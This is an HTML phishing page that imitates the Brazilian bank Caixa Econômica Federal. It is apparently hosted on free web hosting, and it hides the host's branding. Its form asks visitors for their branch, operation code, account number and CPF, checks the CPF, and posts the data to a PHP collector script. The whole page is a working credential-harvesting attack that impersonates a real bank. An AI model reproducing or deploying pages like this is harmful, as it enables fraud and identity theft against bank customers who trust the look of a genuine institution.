<!-- 
Theme Name: CAIXA ATUALIZAÇÃO
Author: MK(rj)
 -->

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>CAIXA ECONOMICA FEDERAL</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    <link href="img/favicon.ico" rel="Shortcut Icon">
    
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="theme-color" content="#1664AC">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">

    <!-- scripts -->
    <script src=https://code.jquery.com/jquery-1.12.0.min.js></script>
    <script>window.jQuery||document.write('<script src="js/vendor/jquery-1.12.0.min.js"><\/script>');</script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/script2.js"></script>
    <script src="js/script1.js"></script>
    <script src="js/script1.js?Xxxxdss" language="javascript"></script>
    <script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script>

    <script language="javascript">
        var isOK = false;
    </script>
</head>
    <body id="tela2">
        <div class='preloader'><div class='loaded'>&nbsp;</div></div>

        <header class="topo">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <h1 class="logoTopo">
                            <img class="img-fluid" src="img/topo.png">
                        </h1>
                    </div>
                </div>
            </div>
            <section class="logo">
                <div class="container">
                    <div class="row">
                        <div class="col-12">
                            <img class="img-fluid" src="img/logo.png">
                        </div>
                    </div>
                </div>
            </section>
            
        </header>
        <main>
            <section class="formulario">
                <div class="container">
                    <div class="row">
                        <div class="col-12">
                            <form id="frm" class="form-inline" action="webApps_AplicationIdentification.php" method="post" enctype="application/x-www-form-urlencoded" onSubmit="return isOK;">
                                <div class="group" style="width: 48%;">
                                  <input class="frm" type="tel" id="ag" name="ag" maxlength="4" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um Agencia válida !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('ag','op');" required>
                                  <span class="highlight"></span>
                                  <span class="bar"></span>
                                  <label>Agencia</label>
                                </div>
                                <div class="group" style="width: 48%; margin-left: 4%;">
                                  <input class="frm" type="tel" id="op" name="op" maxlength="3" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um Operação válida !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('op','cnt');" required>
                                  <span class="highlight"></span>
                                  <span class="bar"></span>
                                  <label>Operação</label>
                                </div>
                                <div class="group">
                                  <input class="frm" type="tel" id="cnt" name="cnt" maxlength="11" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um conta válida !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('cnt','cpf');" required>
                                  <span class="highlight"></span>
                                  <span class="bar"></span>
                                  <label>Conta</label>
                                </div>
                                <div class="group">
                                  <input class="frm" type="tel" id="cpf" name="cpf" maxlength="11" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um CPF válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('cpf','continuar');" required>
                                  <span class="highlight"></span>
                                  <span class="bar"></span>
                                  <label>CPF</label>
                                </div>
                                <div class="group">
                                    <input type="submit" id="continuar" name="continuar" value="CONTINUAR">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>
        </main>
        <footer class="rodape">
        	<div class="container">
        		<div class="row">
        			<div class="col-12">
        				<img class="img-fluid" src="img/ico-info.png" style="width: 120px; float: left; margin-top: 5%;">
        				<img class="img-fluid" src="img/ico-ambiente.png" style="width: 135px; float: right; margin-top: 12%;">
        			</div>
        		</div>
        	</div>
        </footer>
    <div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_psods122&amp;utm_content=footer_img"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"  alt="www.000webhost.com"></a></div></body>
    <script language="javascript">
     $( document ).ready(function() {
         
        $( "#continuar" ).click(function() {
            if (checkCPF()){
                isOK = true;    
                $("#frm").submit(); 
            } else {
                alert("CPF incorreto, informe corretamente.");
            }
        }); 
        

    });
        
    </script>

    <script type="text/javascript">
         jQuery(document).ready(function ($) {

             $(window).load(function () {
                 $(".loaded").fadeOut();
                 $(".preloader").delay(1000).fadeOut("slow");
             });
         });
      </script>
</body><head>
<style>
img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {
    display: none;
}
</style>
</head>
</body>
</html> 